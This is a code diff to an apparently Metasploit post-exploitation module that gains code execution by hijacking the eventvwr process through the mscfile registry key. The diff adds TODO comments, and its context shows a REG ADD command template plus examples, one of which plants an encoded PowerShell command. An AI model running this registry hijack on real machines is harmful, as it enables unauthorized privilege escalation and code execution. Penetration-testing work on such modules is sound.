@@ -160,6 +160,8 @@ class MetasploitModule < Msf::Post
 
 
 
+#TODO: check IF set use_powershell true works
+#TODO: check IF #{comm_inje} has successefuly injected.
 # -------------------------------------------------------
 # GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
 # -------------------------------------------------------
@@ -210,7 +212,7 @@ def ls_stage1
       comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
     end
 
- # Execute process hijacking in registry...
+ # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
  print_good(" Hijacking proccess to gain code execution...")
@@ -237,6 +239,7 @@ end
 
 
 
+#TODO: check IF #{reg_clean} has sucessefuly deleted value
 # ----------------------------------------------------
 # DELETE MALICIOUS REGISTRY ENTRY (proccess hijacking)
 # ----------------------------------------------------
@@ -300,6 +303,7 @@ end
 
 
 
+#TODO: check IF vuln_valu = "(Default)" gives error
 # -------------------------------------------
 # CHECK TARGET VULNERABILITY STATUS/EXISTANCE
 # -------------------------------------------
@@ -360,6 +364,7 @@ end
 
 
 
+#TODO: check IF sysinfo['OS'] =~ gives error
 # ------------------------------------------------
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
 # Running sellected modules against session target
